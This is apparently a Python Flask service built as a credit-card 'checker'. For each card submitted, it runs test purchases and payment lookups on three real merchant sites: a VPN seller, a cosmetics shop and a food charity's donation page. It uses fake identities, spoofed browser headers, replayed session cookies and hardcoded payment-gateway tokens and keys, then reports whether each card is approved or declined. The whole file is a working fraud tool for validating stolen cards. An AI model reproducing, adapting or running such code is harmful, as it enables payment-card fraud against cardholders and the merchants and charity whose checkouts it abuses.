from flask import Flask, request, jsonify
import requests
import re
import random
import time
import string
import base64
import user_agent
from faker import Faker
from bs4 import BeautifulSoup

app = Flask(__name__)

def vbv(ccx):
    try:
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3]
        
        if "20" in yy:
            yy = yy.split("20")[1]
            
        user = user_agent.generate_user_agent()
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
            'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjM1NDg3MDYsImp0aSI6ImZiNjIzYjExLWY0OGEtNGU4MS1hYjVkLTZkNGZjYzkwYTM5NSIsInN1YiI6ImZyOG5uZzY1N2h3d3kzbW4iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImZyOG5uZzY1N2h3d3kzbW4iLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJjdXN0b21lcl9pZCI6Ijg5MTg1NzQxNTk5IiwibWVyY2hhbnRfYWNjb3VudF9pZCI6Iml2cG5VU0QifX0.rAlkCUb0kPlVamc_MmYnlBaXNfc78gjo6Q0mKpgTJQADpE5V5JhH0WqTTHBYzjXTzUYuS2_sWLe-Q3UmJ_-dDg?customer_id=',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'priority': 'u=1, i',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        }

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': '18c82e6e-a51c-475b-b8df-4de629f9ecf8',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': n,
                        'expirationMonth': mm,
                        'expirationYear': yy,
                        'cvv': cvc,
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
        tok = response.json()['data']['tokenizeCreditCard']['token']
        
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
            'content-type': 'application/json',
            'origin': 'https://www.ivpn.net',
            'priority': 'u=1, i',
            'referer': 'https://www.ivpn.net/',
            'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        }

        json_data = {
            'amount': 60,
            'additionalInfo': {},
            'bin': '536347',
            'dfReferenceId': '0_fc90f7ac-bfc4-49f9-8100-27625b507937',
            'clientMetadata': {
                'requestedThreeDSecureVersion': '2',
                'sdkVersion': 'web/3.101.0',
                'cardinalDeviceDataCollectionTimeElapsed': 5,
                'issuerDeviceDataCollectionTimeElapsed': 5507,
                'issuerDeviceDataCollectionResult': True,
            },
            'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjM1NDg3MDYsImp0aSI6ImZiNjIzYjExLWY0OGEtNGU4MS1hYjVkLTZkNGZjYzkwYTM5NSIsInN1YiI6ImZyOG5uZzY1N2h3d3kzbW4iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImZyOG5uZzY1N2h3d3kzbW4iLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJjdXN0b21lcl9pZCI6Ijg5MTg1NzQxNTk5IiwibWVyY2hhbnRfYWNjb3VudF9pZCI6Iml2cG5VU0QifX0.rAlkCUb0kPlVamc_MmYnlBaXNfc78gjo6Q0mKpgTJQADpE5V5JhH0WqTTHBYzjXTzUYuS2_sWLe-Q3UmJ_-dDg?customer_id=',
            'braintreeLibraryVersion': 'braintree/web/3.101.0',
            '_meta': {
                'merchantAppId': 'www.ivpn.net',
                'platform': 'web',
                'sdkVersion': '3.101.0',
                'source': 'client',
                'integration': 'custom',
                'integrationType': 'custom',
                'sessionId': '18c82e6e-a51c-475b-b8df-4de629f9ecf8',
            },
        }

        response = requests.post(
            f'https://api.braintreegateway.com/merchants/fr8nng657hwwy3mn/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
            headers=headers,
            json=json_data,
        )
        
        t = (response.json()['paymentMethod']['threeDSecureInfo']['status'])
        if 'successful' in t:
            return 'authenticate_attempt_successful'
        else:
            return t
            
    except Exception as e:
        return f"Error: {str(e)}"

def st(ccx):
    try:
        f = Faker()
        u = f.user_agent()
        mail=str(f.email()).replace('example','gmail')
        name=str(f.name())
        frs = name.split(' ')[0]
        las = name.split(' ')[1]
        ad = f.address()
        nm = (frs + ' ' + las)
        ccx=ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3]
        m = f"{mm}{yy}"
        if not "20" in yy:
            m = f'{mm}20{yy}'
            
        user = user_agent.generate_user_agent()
        headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json; charset=UTF-8',
            'Origin': 'https://facesbybrandi.com',
            'Referer': 'https://facesbybrandi.com/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'cross-site',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }
        
        json_data = {
            'securePaymentContainerRequest': {
                'merchantAuthentication': {
                    'name': '2wJ7Wr7b',
                    'clientKey': '2sD9ZSq255j77wdKcQ4QDaujxG6mLH7E8FL5357Z2Gxh6VDQfVYUU8NA5HfqXR8b',
                },
                'data': {
                    'type': 'TOKEN',
                    'id': '3dfba496-f2e8-901a-26bb-03b04d53c8e5',
                    'token': {
                        'cardNumber': n,
                        'expirationDate': m,
                        'cardCode': cvc,
                        'zip': '10080',
                        'fullName': 'anans asdwr',
                    },
                },
            },
        }
        
        response = requests.post('https://api2.authorize.net/xml/v1/request.api', headers=headers, json=json_data)
        nonce = (re.search(r',"dataValue":"(.*?)"', response.text).group(1))
        
        cookies = {
            'sbjs_migrations': '1418474375998%3D1',
            'sbjs_current_add': 'fd%3D2024-08-17%2015%3A25%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Ffacesbybrandi.com%2F%7C%7C%7Crf%3D%28none%29',
            'sbjs_first_add': 'fd%3D2024-08-17%2015%3A25%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Ffacesbybrandi.com%2F%7C%7C%7Crf%3D%28none%29',
            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F125.0.0.0%20Safari%2F537.36',
            '_tccl_visitor': '854e88b2-5fb1-4474-822d-40d8e0233374',
            '_tccl_visit': '854e88b2-5fb1-4474-822d-40d8e0233374',
            'woocommerce_items_in_cart': '1',
            'wp_woocommerce_session_ddf106e3b967197d43c9524c1322be44': 't_1c9e7b72c60bc36dda0aa7c00c2bae%7C%7C1725698987%7C%7C1725612587%7C%7Cb67ce1e48eb118101b3d947c391df0df',
            'sbjs_session': 'pgs%3D27%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ffacesbybrandi.com%2Fcheckout%2F',
            '_scc_session': 'pc=27&C_TOUCH=2024-08-17T15:32:40.207Z',
            'woocommerce_cart_hash': '1e71051e7702bc956b98ae345655f1a2',
        }
        
        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://facesbybrandi.com',
            'priority': 'u=1, i',
            'referer': 'https://facesbybrandi.com/checkout/',
            'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        params = {
            'wc-ajax': 'checkout',
        }
        
        data = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Ffacesbybrandi.com%2F&wc_order_attribution_session_start_time=2024-08-17+15%3A25%3A04&wc_order_attribution_session_pages=27&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F125.0.0.0+Safari%2F537.36&billing_first_name=anans&billing_last_name=asdwr&billing_country=US&billing_address_1=216+St+James+Ave&billing_address_2=&billing_city=Goose+Creek&billing_state=NY&billing_postcode=10080&billing_phone=08438638882&billing_email=jppp5114%40gmail.com&shipping_first_name=&shipping_last_name=&shipping_country=US&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=MD&shipping_postcode=&order_comments=&shipping_method%5B0%5D=usps%3A2%3AD_PRIORITY_MAIL&payment_method=authorize_net_cim_credit_card&wc-authorize-net-cim-credit-card-expiry=12+%2F+27&wc-authorize-net-cim-credit-card-payment-nonce={nonce}&wc-authorize-net-cim-credit-card-payment-descriptor=COMMON.ACCEPT.INAPP.PAYMENT&wc-authorize-net-cim-credit-card-last-four=3766&wc-authorize-net-cim-credit-card-card-type=mastercard&terms=on&terms-field=1&woocommerce-process-checkout-nonce=4d1ae66bc1&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review'
        
        response = requests.post('https://facesbybrandi.com/', params=params, cookies=cookies, headers=headers, data=data)
        p = (response.json()['messages'])
        if "The provided card was declined," in p:
            return "The provided card was declined,"
        else:
            return 'Approved'
            
    except Exception as e:
        return f"Error: {str(e)}"

def styt(ccx):
    try:
        import requests
        f = Faker()
        u = f.user_agent()
        mail=str(f.email()).replace('example','gmail')
        name=str(f.name())
        frs = name.split(' ')[0]
        las = name.split(' ')[1]
        ccx=ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3]
        if "20" in yy:
            yy = yy.split("20")[1]
            
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': u,
        }
        
        data = f'guid=e5e016cd-c8d8-488e-b71c-7d54835e456122fdd1&muid=63747385-e6e3-4765-97a4-9f318948140be56a79&sid=a70ec69e-bf4c-403b-bcff-46964e893dfbf2204d&referrer=https%3A%2F%2Fsharethemeal.org&time_on_page=60620&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQYvFDS31JCo4GWtlVkPfW1CFDxwKILVDlAsvYPFo-kUcAndimndYmlKhDjScX8KUrQWVSm_v0GVGjjoFbxSk-DGzWqUaCqDBsNZxGMQFsx5-BL4D18Gt6dZpnRxTs1aI8v3nqUFtMo0RAb6AFUMJqAV2mmqax8IFO59FIBK8RtVb4xAxVR1cEWGuaK17ju65zR-8aOnprgFTTfOpZZE2vihuKWmyXv7vyi4pDZRU9E6OR_wlvt03LsNNrXgshpzmN3vwBEdX5vTw9mtID0FiU36fgKRyv0PhaIlk8wIamw8xd4oDeR49RoRpRa2YJ8zf-Y4kYxLApDhqPQte5vJmpcPtnVQu6C_6CL8ogCYlRIlVPCk90-R1Dtupiun4uxYJS-C1EHQmK040N9LYx7Jipnc0laYhkJBntA6gB9gHnlt6unDgto2sALskqPZrtt30TrS5HTgZSoPXl63_un_UwcWIGKIzG59dmgfIKnHxUZE7R3CusVm8pyyQULTGxsnfVo01EKvEMfywHb6O7PmUupJ1wvg4EgmlN5BgrS3GxiVUzOwWRJg7axq8Ns8wrlkfVil7L1B8hpd6wsi9nQfO1BVrWs26v74mD2ikiCcGfBHSFHD5Rk0F_sEZ0M4k8CVqVW_VPavLU7ahFAm0MavmNtsQf0E8DoLqmoATyr7rY-kX-RpzOzYKW0A1hc1nfZ4lgRlTLRgSMtz-mK-jsFAUiq7qV4pa8rZRdEp0y57BqO5ACuFyzSrNaRYRsho9sRDAsU9CGoStlhEbBliJcrK9m16N3dO0RDjLuBK6Vy0xxiAhB0Gyy_0etgAKcQJOP-u4762nhNddIw5LyNTFtntX0yZclAnTtJEdfMZ-CfBi4nMAbagZSMANwY2skeaQCmcWqCaRLjYRm4xXubOfHGLmNNrRt4ZW8IDhhzJzsn9RtH0yfEoALlr_nmd9UvU-cumyFAsBR2FzddnzZAFi5wsJRCbgQW6jI0fjgOJ2FvOXV1ZmnkJrTr3fTXgpn33v5xqioYaHvM9Zw6bRyDpA2bgSKdOJh30nGWLtXP93xW3lND0X6h9BKXgP9jGMLIH86y68fWuQ1JMC3iVEAzt1ReV0BDRWvC9YaBA3ccX8q9PvUfPAI_pU_2AgA2EmwsNOEWNXLva2XOT6joGe3FaKZEhXSzFwvlBeaheBzJkP6NyfX1G2BEQ9nb3nnRjlLVKCv0wGe1k6-WCkhi9wGu51Aqb9dWXXV3oW7Ib4345M4gX-nb_7N4bjeTkGjxH7CQBS7uek2LrsGKl8gOylxSLfXpntXwc99I0pH2MT1TFKqH8srP5xtsSATq_AJoAjzUsq_zW3pqQsj2UsLWmPpiwYxnlnvfr3JSWoyFN-WqzoASqmL2Ws-__4jC6mhvAFHoFSZ0GeLtHFIGgoP7Y3VU_FrFYpqidAOhDxLysG6qm3f1yO9v-Db_CZsSVrtAA45T6NdH9ystif7_KxmCRQaCoU558y4BZPDgcVtf_VFDgs0GRr7u209Uxf89IHlXIWS85bAKvla6shoK-ZOvSXIVPtPJFrc7Xe6VUOEJZx_LJ74RItUk3fD0LJ3SUfhgfSPZ5qoiUb9yj-PeOqzLtYzIujb2SYtuve0Ei0Ro6cXImdH6Qgi2VCjqbln1Q95aQjVasRZhn7178cj2Mrv55cRIwTxPU5HdX99DxMlNM3-1XYO91kuWo4ND96QbEV8w9Df5Z1xjJqxiXSodE7DviaVxAhD7k1tcKy13CZKvrhK51TOzwwIMrv-5pPsHLYIJQZ2iDPR1oPLi30UuBF5AR-gNad5IZDZ032gj96SiF2nSVGxWKDaIhJ9vuX19UzplYZSsVFVMVA63Fc3foH8COjucx4iZs7crWxstJl05dNHGVojqv62I_JxdCyj9X3mRlrvUjx-4Ftm7gh8dBHvN8mgl-aIygUllRdqd7oZBHraFCfIYAyHrQPgMGZWwlRJXD3qeEmdfDR-7wJ8nKAPOBfe9RxqBSMxlWZBrxWRi66xU9nNFAGcCYshxmtGnX6Cj4DzvGCz9JKpUXHUIGrbrXxVa1a6cQNTL7khGbwQnDBWcyt0AePTqexfsADa4S57QZ-rymRE6LKjZXhwzmaDz8Ooc2hhcmRfaWTOAzGDb6JrcqgyOWRjZWUzZaJwZAA.E_PWX_j37J9IlxZS5EKhh-TNILHA0hd8ZGxvAENnomc&payment_user_agent=stripe.js%2F6ce7db85dd%3B+stripe-js-v3%2F6ce7db85dd%3B+card-element&pasted_fields=number&key=pk_live_51CG6QIAuAfacV15ffMAByPbXjXCzrIxODFNItPs4zRuFHJHY9kvYiuUeAvjD7OwPM64BoJQ23AJVrAWYMoC4GtxY00PMX2UyCa'
        
        response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
        token_id=response.json()['id']
        
        cookies = {
            '_fbp': 'fb.1.1719914279123.654148206765781737',
            'stmDeviceId': '4d418a40-17d5-4224-b069-b55e80b55a47',
            'AMP_MKTG_7fe3705773': 'JTdCJTIycmVmZXJyZXIlMjIlM0ElMjJodHRwcyUzQSUyRiUyRnd3dy5nb29nbGUuY29tJTJGJTIyJTJDJTIycmVmZXJyaW5nX2RvbWFpbiUyMiUzQSUyMnd3dy5nb29nbGUuY29tJTIyJTdE',
            'aws-waf-token': 'b42dbfb5-992d-4662-8785-14312251932d:IAoAo6FFQNEEAAAA:54DV9z/GbiLMYgtgB7It0Hp/ZP9IRtHkBp945xdAdeqRSM9VR1fRMWJt4WxAZ776up6switZc50ZIb4QxpsN0VBrR4o6AQZplbzyupySITL7ZLFOJj1TROkcoZh0ERznzSwE6mIkRp4L078fvH2XYA3lUSiB9IWpWrn+olujUiX8W8zjImrBoE9UYwYV1NblYvI2a9fWQXNL2A8=',
            '_tt_enable_cookie': '1',
            '_ttp': 'DK-afSysGDOHJTkPniz2Ytn9596',
            'connect.sid': 's%3AeZvXlxbxp7r8Bbyk-q8coywq8m2FK_Ha.crYdam1ot6unHMM1RWCss8Q3DLowExfsPH%2Bu5Dl0fGw',
            '__stripe_mid': '63747385-e6e3-4765-97a4-9f318948140be56a79',
            '__stripe_sid': 'a70ec69e-bf4c-403b-bcff-46964e893dfbf2204d',
            '_ga': 'GA1.1.302589018.1719914312',
            '_ga_N348N6YQFE': 'GS1.1.1719914312.1.1.1719914355.17.0.0',
            'AMP_7fe3705773': 'JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjI0ZDQxOGE0MC0xN2Q1LTQyMjQtYjA2OS1iNTVlODBiNTVhNDclMjIlMkMlMjJzZXNzaW9uSWQlMjIlM0ExNzE5OTE0Mjc5NTU4JTJDJTIyb3B0T3V0JTIyJTNBZmFsc2UlMkMlMjJsYXN0RXZlbnRUaW1lJTIyJTNBMTcxOTkxNDM1NTYzNyUyQyUyMmxhc3RFdmVudElkJTIyJTNBMTclN0Q=',
        }
        
        headers = {
            'authority': 'app.sharethemeal.org',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
            'authorization': 'Bearer LAXQszxcmpGMWi24y0NFt00YPWGJnJOo9Ba8ijLcI1fmiKHI1PDF7KG7PGJU7KcX',
            'content-type': 'application/json',
            'origin': 'https://sharethemeal.org',
            'referer': 'https://sharethemeal.org/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'stm-app-version': '3.12.0',
            'stm-device-id': '4d418a40-17d5-4224-b069-b55e80b55a47',
            'stm-platform': 'web',
            'stm-request-id': '8bc0df06-ce88-4ca8-b931-b2d1a7b0ecf6',
            'stm-timezone': 'Africa/Cairo',
            'user-agent': u,
            'x-aws-waf-token': 'b42dbfb5-992d-4662-8785-14312251932d:IAoAo6FFQNEEAAAA:54DV9z/GbiLMYgtgB7It0Hp/ZP9IRtHkBp945xdAdeqRSM9VR1fRMWJt4WxAZ776up6switZc50ZIb4QxpsN0VBrR4o6AQZplbzyupySITL7ZLFOJj1TROkcoZh0ERznzSwE6mIkRp4L078fvH2XYA3lUSiB9IWpWrn+olujUiX8W8zjImrBoE9UYwYV1NblYvI2a9fWQXNL2A8=',
        }
        
        json_data = {
            'amount': 0.8,
            'billingDetails': {
                'addressLine1': 'New York',
                'city': 'New York ',
                'country': 'US',
                'email': mail,
                'fullName': 'Mhfo Mansour ',
                'zipCode': '10080',
            },
            'campaignId': 'palestine11',
            'currency': 'USD',
            'doNotVault': False,
            'paymentMethodNonce': token_id,
            'paymentMethodToken': '',
            'paymentMethodType': 'card',
            'provider': 'stripe',
            'idempotencyKey': 'ca2d3eb4-ff18-485c-8640-4ce466430b56',
        }
        
        response = requests.post(
            'https://app.sharethemeal.org/api/v2.0/payments/userHashPlaceholder/transactions',
            cookies=cookies,
            headers=headers,
            json=json_data,
        )
        
        time.sleep(5)
        abdo = (response.json()['message'])
        if 'حدث خطأ ما. تم رفض تبرعك لسبب غير معروف. يرجى استخدام بطاقة أخرى.'  in abdo:
            return 'Your card was declined'
        else:
            return 'Approved'
            
    except Exception as e:
        return f"Error: {str(e)}"

@app.route('/check_card', methods=['POST'])
def check_card():
    try:
        data = request.get_json()
        cc = data.get('cc')
        
        if not cc:
            return jsonify({'error': 'No credit card provided'}), 400
            
        result1 = vbv(cc)
        result2 = st(cc)
        result3 = styt(cc)
        
        return jsonify({
            'vbv_result': result1,
            'st_result': result2,
            'styt_result': result3
        }), 200
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
